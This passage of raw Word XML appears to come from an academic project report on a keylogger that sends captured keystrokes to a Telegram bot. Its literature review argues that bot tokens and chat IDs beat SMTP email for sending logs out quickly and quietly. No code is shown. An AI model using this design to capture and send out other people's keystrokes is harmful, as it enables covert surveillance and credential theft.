              <w:t>Monitors keystrokes, apps, internet</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1EEFB64D" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Limited free features, premium required for real-time</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="6B6EB009" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1E8D42E7" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Telegram Bots (Post-2020)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C4C5297" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Python / NodeJS / Java</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="070926F4" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Secure messaging platform, APIs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="052805AF" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Requires token and chat IDs, manual setup</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="10644295" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">The trend shows a shift from </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>email-based</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> reporting to </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>messaging API-based</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> reporting, because:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="715B0499" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Messaging APIs have </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>end-to-end encryption</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the platform.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BCC63CF" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Faster, near real-time delivery.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1DCA59" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Less configuration hassle (no SMTP credentials, no firewalls).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E8A37B" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Works on mobile devices instantly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D475EF" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="13281280">
          <v:rect id="_x0000_i1341" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CBD19E7" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>2.2 Existing Systems</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D97A915" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Email-based keyloggers:</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>Many open-source and academic projects rely on SMTP email services like Gmail to transmit logs. While this was practical earlier, email services now have:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3E4F57" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Two-factor authentication (2FA).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="277685BD" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>App password requirements.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08F561EE" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Suspicious activity blocking.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48BA98C3" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>This makes email-based keyloggers less reliable and more complex for new developers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39835E9C" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Telegram-based keyloggers (Proposed):</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Telegram Bots allow secure, programmable messaging. By creating a bot through </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>BotFather</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">, developers obtain a </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>bot token</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>. Using the Telegram API with Python’s requests library allows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FD1647B" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Sending logs directly to a private chat.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F08AC69" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Using Telegram as a real-time console for monitoring activity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ACAF703" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Simplified authentication.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4772F0C7" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="035A82FC">
          <v:rect id="_x0000_i1342" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F8BCF19" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>2.3 Research Gap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5194AC86" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Email-based loggers suffer from SMTP authentication hurdles.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FAB8498" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Existing Telegram-based loggers are often not documented in an academic style.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="020A94FD" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Few projects combine ethical considerations, open-source code, and </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>threaded periodic reporting</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B025240" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="425F9FCA">
          <v:rect id="_x0000_i1343" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="531A3EC3" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>2.4 Advantages of Using Telegram over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465"/>
        <w:gridCol w:w="2989"/>
      </w:tblGrid>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="597E8502" w14:textId="77777777">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="30E6A3C5" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Factor</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1B2589BF" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Email-Based</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0A221B50" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Telegram-Based</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="20085E4D" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="65C1795D" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Setup</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4A59C43E" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Requires SMTP server, username/password, app passwords</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="70CA6818" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Only bot token &amp; chat ID</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="71B2B132" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C1673EE" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Delivery Speed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="046A6800" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Delayed due to mail queues</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="01248944" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Instant push notification</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="6BE0F0A8" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6F44AD8B" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Security</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="38C2A5E8" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Email accounts vulnerable to phishing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1E638B3A" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Telegram bot isolated from main account</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="7C350B75" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F7D4CE7" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Mobile Access</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="74FBF4BC" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Email client needed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
